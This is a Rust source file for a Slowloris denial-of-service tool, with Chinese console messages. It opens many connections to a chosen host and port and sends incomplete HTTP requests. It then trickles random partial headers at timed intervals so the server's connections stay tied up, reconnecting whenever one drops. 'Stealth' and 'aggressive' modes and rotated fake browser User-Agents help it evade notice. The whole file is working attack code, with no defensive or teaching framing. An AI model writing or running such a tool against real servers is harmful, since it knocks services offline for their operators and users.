use crate::stats::{Stats, StatsArc};
use indicatif::{ProgressBar, ProgressStyle};
use rand::Rng;
use std::net::{TcpStream, SocketAddr};
use std::sync::Arc;
use std::time::{Duration, Instant};
use tokio::time::sleep;
use std::io::{Write, Read};
use std::collections::HashMap;
use std::sync::Mutex;

#[derive(Debug, Clone)]
pub struct SlowlorisConfig {
    pub target: String,
    pub port: u16,
    pub connections: usize,
    pub duration: u64,
    pub mode: String,
    pub timeout: u64,
    pub keep_alive: bool,
    pub random_headers: bool,
    pub min_interval: u64,
    pub max_interval: u64,
}

pub async fn run_slowloris(config: SlowlorisConfig) {
    println!("🐌 Slowloris攻击开始");
    println!("目标: {}:{}", config.target, config.port);
    println!("并发连接数: {}", config.connections);
    println!("持续时间: {}秒", config.duration);
    println!("攻击模式: {}", config.mode);
    println!("超时时间: {}秒", config.timeout);
    println!("保持连接: {}", if config.keep_alive { "是" } else { "否" });
    println!("随机头部: {}", if config.random_headers { "是" } else { "否" });
    println!();

    let stats_collector = Arc::new(StatsArc::default());
    let start_time = Instant::now();
    let duration = Duration::from_secs(config.duration);

    // 创建进度条
    let progress_bar = ProgressBar::new(config.duration);
    progress_bar.set_style(
        ProgressStyle::default_bar()
            .template("{spinner:.green} [{elapsed_precise}] [{bar:40.cyan/blue}] {pos}/{len}s ({eta})")
            .unwrap()
            .progress_chars("#>-"),
    );

    // 根据攻击模式调整参数
    let (connections, interval_range) = match config.mode.as_str() {
        "normal" => (config.connections, config.min_interval..config.max_interval),
        "stealth" => (config.connections / 2, (config.min_interval * 2)..(config.max_interval * 3)),
        "aggressive" => (config.connections * 2, 1..config.max_interval / 2),
        _ => (config.connections, config.min_interval..config.max_interval),
    };

    println!("🎯 调整后的参数:");
    println!("实际并发数: {}", connections);
    println!("发送间隔: {}ms - {}ms", interval_range.start, interval_range.end);
    println!();

    // 预生成随机数据以减少运行时开销
    let header_names = vec![
        "Custom", "X-Requested", "X-Forwarded", "X-Real", "CF-Connecting",
        "X-Client", "X-Remote", "X-Proxy", "X-Original", "X-External",
    ];
    
    let user_agents = vec![
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:90.0) Gecko/20100101 Firefox/90.0",
    ];

    let languages = vec![
        "zh-CN,zh;q=0.9,en;q=0.8",
        "en-US,en;q=0.9",
        "en-GB,en;q=0.9",
        "zh-TW,zh;q=0.9,en;q=0.8",
        "ja-JP,ja;q=0.9,en;q=0.8",
        "ko-KR,ko;q=0.9,en;q=0.8",
        "fr-FR,fr;q=0.9,en;q=0.8",
        "de-DE,de;q=0.9,en;q=0.8",
        "es-ES,es;q=0.9,en;q=0.8",
        "it-IT,it;q=0.9,en;q=0.8",
    ];

    // 启动统计更新任务
    let stats_collector_clone = stats_collector.clone();
    let progress_bar_clone = progress_bar.clone();
    tokio::spawn(async move {
        let mut interval = tokio::time::interval(Duration::from_secs(1));
        loop {
            interval.tick().await;
            let stats = stats_collector_clone.lock().unwrap();
            progress_bar_clone.set_message(format!(
                "📊 活跃连接: {} | 成功: {} | 失败: {} | 总计: {}",
                stats.total_requests, stats.successful_requests, stats.failed_requests, stats.total_requests
            ));
        }
    });

    // 启动Slowloris攻击任务
    let mut handles = Vec::new();
    for _ in 0..connections {
        let config_clone = config.clone();
        let stats_collector_clone = stats_collector.clone();
        let interval_range_clone = interval_range.clone();
        let header_names_clone = header_names.clone();
        let user_agents_clone = user_agents.clone();
        let languages_clone = languages.clone();

        let handle = tokio::spawn(async move {
            slowloris_worker(
                config_clone, 
                stats_collector_clone, 
                interval_range_clone,
                header_names_clone,
                user_agents_clone,
                languages_clone,
            ).await;
        });
        handles.push(handle);
    }

    // 等待所有任务完成或超时
    let timeout_future = tokio::time::sleep(duration);
    let _ = tokio::select! {
        _ = async {
            for handle in handles {
                let _ = handle.await;
            }
        } => {},
        _ = timeout_future => {
            println!("⏰ 攻击时间结束");
        }
    };

    progress_bar.finish_with_message("攻击完成");

    // 显示最终统计
    let final_stats = stats_collector.lock().unwrap();
    let elapsed = start_time.elapsed();
    
    println!("\n📊 最终攻击统计:");
    println!("总运行时间: {:.2}秒", elapsed.as_secs_f64());
    println!("目标: {}:{}", config.target, config.port);
    println!("并发连接数: {}", connections);
    println!("总连接数: {}", final_stats.total_requests);
    println!("成功连接: {}", final_stats.successful_requests);
    println!("失败连接: {}", final_stats.failed_requests);
    println!("平均活跃连接: {:.0}", final_stats.total_requests as f64 / elapsed.as_secs_f64());
    println!("成功率: {:.1}%", 
        if final_stats.total_requests > 0 {
            (final_stats.successful_requests as f64 / final_stats.total_requests as f64) * 100.0
        } else {
            0.0
        }
    );
}

async fn slowloris_worker(
    config: SlowlorisConfig,
    stats_collector: Arc<StatsArc>,
    interval_range: std::ops::Range<u64>,
    header_names: Vec<&'static str>,
    user_agents: Vec<&'static str>,
    languages: Vec<&'static str>,
) {
    let target_addr = format!("{}:{}", config.target, config.port);
    
    // 建立初始连接
    let mut stream = match TcpStream::connect(&target_addr) {
        Ok(stream) => {
            let mut stats = stats_collector.lock().unwrap();
            stats.add_request(true, 0, 0);
            stream
        }
        Err(_) => {
            let mut stats = stats_collector.lock().unwrap();
            stats.add_request(false, 0, 0);
            return;
        }
    };

    // 发送初始HTTP请求
    let initial_request = format!(
        "GET / HTTP/1.1\r\n\
         Host: {}\r\n\
         User-Agent: {}\r\n\
         Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n\
         Accept-Language: {}\r\n\
         Accept-Encoding: gzip, deflate\r\n\
         Connection: keep-alive\r\n\
         Cache-Control: no-cache\r\n",
        config.target,
        user_agents[rand::thread_rng().gen_range(0..user_agents.len())],
        languages[rand::thread_rng().gen_range(0..languages.len())]
    );

    if let Err(_) = stream.write_all(initial_request.as_bytes()) {
        let mut stats = stats_collector.lock().unwrap();
        stats.add_request(false, 0, 0);
        return;
    }

    // 保持连接活跃
    let mut connection_id = 0;
    loop {
        // 随机延迟
        let interval = rand::thread_rng().gen_range(interval_range.clone());
        sleep(Duration::from_millis(interval)).await;

        // 发送部分HTTP头部
        let partial_header = if config.random_headers {
            let header_name = header_names[rand::thread_rng().gen_range(0..header_names.len())];
            format!(
                "X-{}-Header: {}\r\n",
                header_name,
                generate_random_header_value()
            )
        } else {
            format!("X-{}-Header: {}\r\n", connection_id, rand::thread_rng().gen::<u32>())
        };

        match stream.write_all(partial_header.as_bytes()) {
            Ok(_) => {
                // 连接保持活跃
                let mut stats = stats_collector.lock().unwrap();
                stats.add_request(true, partial_header.len() as u64, 0);
            }
            Err(_) => {
                // 连接断开，尝试重新连接
                let mut stats = stats_collector.lock().unwrap();
                stats.add_request(false, 0, 0);
                
                // 重新连接
                match TcpStream::connect(&target_addr) {
                    Ok(new_stream) => {
                        stream = new_stream;
                        stats.add_request(true, 0, 0);
                        
                        // 重新发送初始请求
                        if let Err(_) = stream.write_all(initial_request.as_bytes()) {
                            stats.add_request(false, 0, 0);
                            return;
                        }
                    }
                    Err(_) => {
                        stats.add_request(false, 0, 0);
                        return;
                    }
                }
            }
        }

        connection_id += 1;
    }
}

// 生成随机头部值
fn generate_random_header_value() -> String {
    let mut rng = rand::thread_rng();
    let chars: Vec<char> = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789".chars().collect();
    let length = rng.gen_range(5..15);
    (0..length).map(|_| chars[rng.gen_range(0..chars.len())]).collect()
} 